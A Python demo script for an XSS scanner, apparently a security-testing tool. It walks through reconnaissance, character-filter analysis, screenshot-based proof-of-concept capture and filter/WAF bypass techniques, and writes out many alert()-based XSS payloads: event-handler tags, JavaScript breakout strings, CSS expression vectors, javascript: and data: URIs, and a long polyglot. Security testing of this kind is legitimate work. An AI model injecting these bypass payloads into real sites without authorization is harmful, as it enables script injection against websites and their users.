#!/usr/bin/env python3
"""
Advanced Demo for XSS Scanner
Demonstrates advanced reconnaissance, character filtering, and PoC capture features
"""

import sys
import time
from advanced_reconnaissance import AdvancedReconnaissance
from character_filter_analyzer import CharacterFilterAnalyzer
from poc_capture import PoCCapture
import requests

def demo_advanced_reconnaissance():
    """Demonstrate advanced reconnaissance capabilities"""
    print("=" * 60)
    print("ADVANCED RECONNAISSANCE DEMO")
    print("=" * 60)
    
    options = {
        'depth': 2,
        'max_urls': 10,
        'timeout': 5,
        'verbose': False
    }
    
    recon = AdvancedReconnaissance("https://httpbin.org", options)
    
    print("Advanced Reconnaissance Features:")
    print("✓ Comprehensive URL discovery")
    print("✓ Input point analysis")
    print("✓ Character filter detection")
    print("✓ Context-aware analysis")
    print("✓ Vulnerability confirmation")
    
    print(f"\nFilter Test Payloads: {len(recon.filter_test_payloads)}")
    print("Sample dangerous characters:")
    for char in recon.filter_test_payloads[:10]:
        print(f"  - {char}")
    
    print(f"\nContext-Specific Payloads:")
    for context_type, payloads in recon.context_payloads.items():
        print(f"  {context_type}: {len(payloads)} payloads")
        if payloads:
            print(f"    Sample: {payloads[0]}")
    
    print(f"\nAdvanced Features:")
    print("  - JavaScript variable extraction")
    print("  - Form analysis with security indicators")
    print("  - URL parameter reflection detection")
    print("  - Context-specific payload generation")
    print("  - Filter bypass technique detection")

def demo_character_filter_analysis():
    """Demonstrate character filter analysis capabilities"""
    print("\n" + "=" * 60)
    print("CHARACTER FILTER ANALYSIS DEMO")
    print("=" * 60)
    
    session = requests.Session()
    analyzer = CharacterFilterAnalyzer(session)
    
    print("Character Filter Analysis Features:")
    print("✓ Dangerous character detection")
    print("✓ XSS keyword filtering")
    print("✓ Filter pattern analysis")
    print("✓ Bypass technique generation")
    print("✓ Context-specific recommendations")
    
    print(f"\nDangerous Characters: {len(analyzer.dangerous_chars)}")
    print("Sample dangerous characters:")
    for char in analyzer.dangerous_chars[:15]:
        print(f"  - '{char}'")
    
    print(f"\nXSS Keywords: {len(analyzer.xss_keywords)}")
    print("Sample XSS keywords:")
    for keyword in analyzer.xss_keywords[:10]:
        print(f"  - {keyword}")
    
    print(f"\nBypass Methods: {len(analyzer.bypass_methods)}")
    print("Available bypass methods:")
    for method_name in list(analyzer.bypass_methods.keys())[:10]:
        print(f"  - {method_name}")
    
    # Demonstrate encoding techniques
    test_payload = '<script>alert("XSS")</script>'
    print(f"\nEncoding Techniques Demo:")
    print(f"Original payload: {test_payload}")
    
    # URL encoding
    url_encoded = analyzer._url_encode(test_payload)
    print(f"URL encoded: {url_encoded}")
    
    # HTML encoding
    html_encoded = analyzer._html_encode(test_payload)
    print(f"HTML encoded: {html_encoded}")
    
    # Unicode encoding
    unicode_encoded = analyzer._unicode_encode(test_payload)
    print(f"Unicode encoded: {unicode_encoded[:50]}...")
    
    # Case variation
    case_varied = analyzer._case_variation(test_payload)
    print(f"Case varied: {case_varied}")

def demo_poc_capture():
    """Demonstrate PoC capture capabilities"""
    print("\n" + "=" * 60)
    print("PROOF OF CONCEPT CAPTURE DEMO")
    print("=" * 60)
    
    options = {
        'headless': True,
        'timeout': 10
    }
    
    poc_capture = PoCCapture(options)
    
    print("PoC Capture Features:")
    print("✓ Automated screenshot capture")
    print("✓ Alert dialog detection")
    print("✓ Interactive payload injection")
    print("✓ Multi-stage PoC documentation")
    print("✓ Comprehensive vulnerability reports")
    
    print(f"\nScreenshot Directory: {poc_capture.screenshots_dir}")
    print(f"Video Directory: {poc_capture.videos_dir}")
    
    # Demonstrate PoC report generation
    sample_poc_data = {
        'success': True,
        'url': 'https://demo.example.com/search',
        'payload': '<script>alert("XSS")</script>',
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'alert_detected': True,
        'page_title': 'Search Results',
        'current_url': 'https://demo.example.com/search?q=<script>alert("XSS")</script>',
        'input_point': {
            'type': 'form',
            'url': 'https://demo.example.com/search'
        },
        'screenshots': {
            'initial': 'initial_1234567890.png',
            'injection': 'injection_1234567890.png',
            'alert': 'alert_1234567890.png',
            'post_alert': 'post_alert_1234567890.png'
        }
    }
    
    print(f"\nSample PoC Report:")
    report = poc_capture.generate_poc_report(sample_poc_data)
    print(report[:500] + "..." if len(report) > 500 else report)
    
    print(f"\nAdvanced Features:")
    print("  - Selenium WebDriver integration")
    print("  - Headless browser automation")
    print("  - Alert dialog handling")
    print("  - Multi-screenshot capture")
    print("  - Video recording capability")
    print("  - Interactive form filling")
    print("  - URL parameter injection")
    print("  - JavaScript execution monitoring")

def demo_bypass_techniques():
    """Demonstrate bypass techniques"""
    print("\n" + "=" * 60)
    print("BYPASS TECHNIQUES DEMO")
    print("=" * 60)
    
    session = requests.Session()
    analyzer = CharacterFilterAnalyzer(session)
    
    print("Advanced Bypass Techniques:")
    print("✓ Character encoding bypass")
    print("✓ Keyword substitution")
    print("✓ Context-specific bypasses")
    print("✓ Filter evasion methods")
    print("✓ WAF bypass techniques")
    
    # Demonstrate different bypass techniques
    original_payload = '<script>alert("XSS")</script>'
    
    print(f"\nOriginal Payload: {original_payload}")
    print(f"\nBypass Techniques:")
    
    # HTML tag bypass
    html_bypasses = [
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E'
    ]
    
    print("HTML Tag Bypasses:")
    for bypass in html_bypasses:
        print(f"  - {bypass}")
    
    # Event handler bypasses
    event_bypasses = [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src=javascript:alert(1)></iframe>',
        '<object data=javascript:alert(1)></object>',
        '<embed src=javascript:alert(1)>'
    ]
    
    print("\nEvent Handler Bypasses:")
    for bypass in event_bypasses:
        print(f"  - {bypass}")
    
    # JavaScript bypasses
    js_bypasses = [
        ';alert(1);',
        '";alert(1);//',
        "';alert(1);//",
        '`;alert(1);//',
        '${alert(1)}',
        'alert(String.fromCharCode(49))',
        'eval("alert(1)")',
        'Function("alert(1)")()'
    ]
    
    print("\nJavaScript Bypasses:")
    for bypass in js_bypasses:
        print(f"  - {bypass}")
    
    # CSS bypasses
    css_bypasses = [
        'expression(alert(1))',
        'url("javascript:alert(1)")',
        'url(javascript:alert(1))',
        'expression(alert(String.fromCharCode(49)))'
    ]
    
    print("\nCSS Bypasses:")
    for bypass in css_bypasses:
        print(f"  - {bypass}")
    
    # Advanced polyglot bypasses
    polyglot_bypasses = [
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src=javascript:alert(1)></iframe>',
        '<object data=javascript:alert(1)></object>',
        '<embed src=javascript:alert(1)>',
        '<form><button formaction=javascript:alert(1)>X</button>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror=alert(1)>'
    ]
    
    print("\nAdvanced Polyglot Bypasses:")
    for bypass in polyglot_bypasses[:5]:
        print(f"  - {bypass}")

def demo_context_analysis():
    """Demonstrate context analysis capabilities"""
    print("\n" + "=" * 60)
    print("CONTEXT ANALYSIS DEMO")
    print("=" * 60)
    
    print("Context Analysis Features:")
    print("✓ HTML content context detection")
    print("✓ HTML attribute context detection")
    print("✓ JavaScript context detection")
    print("✓ CSS context detection")
    print("✓ URL context detection")
    print("✓ Comment context detection")
    
    # Sample contexts
    contexts = {
        'HTML Content': '<div>User input: <script>alert("XSS")</script></div>',
        'HTML Attribute': '<img src="image.jpg" alt="User input: " onmouseover="alert(\'XSS\')" x="">',
        'JavaScript': '<script>var userInput = ";alert("XSS");//";</script>',
        'CSS': '<style>body { background: expression(alert("XSS")); }</style>',
        'URL': '<a href="javascript:alert(\'XSS\')">Click me</a>'
    }
    
    print(f"\nContext Examples:")
    for context_type, example in contexts.items():
        print(f"\n{context_type}:")
        print(f"  {example}")
        
    print(f"\nContext-Specific Payloads:")
    context_payloads = {
        'HTML Content': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'],
        'HTML Attribute': ['" onmouseover="alert(1)" x="', "' onmouseover='alert(1)' x='"],
        'JavaScript': [';alert(1);', '";alert(1);//', "';alert(1);//"],
        'CSS': ['expression(alert(1))', 'url("javascript:alert(1)")'],
        'URL': ['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>']
    }
    
    for context_type, payloads in context_payloads.items():
        print(f"\n{context_type}:")
        for payload in payloads:
            print(f"  - {payload}")

def main():
    """Main demo function"""
    print("Professional XSS Scanner - Advanced Features Demo")
    print("=" * 60)
    print("This demo showcases the advanced features of the XSS Scanner")
    print("including advanced reconnaissance, character filtering analysis,")
    print("PoC capture, and bypass techniques.")
    print("=" * 60)
    
    try:
        # Run demos
        demo_advanced_reconnaissance()
        demo_character_filter_analysis()
        demo_poc_capture()
        demo_bypass_techniques()
        demo_context_analysis()
        
        print("\n" + "=" * 60)
        print("ADVANCED DEMO COMPLETED SUCCESSFULLY")
        print("=" * 60)
        print("The XSS Scanner now includes:")
        print("✓ Advanced reconnaissance with comprehensive analysis")
        print("✓ Character filter detection and bypass techniques")
        print("✓ Context-aware payload injection")
        print("✓ Automated PoC capture with screenshots")
        print("✓ Multi-format reporting with detailed analysis")
        print("✓ Professional-grade vulnerability detection")
        
        print(f"\nReady for advanced XSS scanning!")
        print("Run 'python xss_scanner.py <target_url>' to start scanning.")
        
    except Exception as e:
        print(f"\nDemo error: {e}")
        print("Please check your installation and try again.")

if __name__ == '__main__':
    main()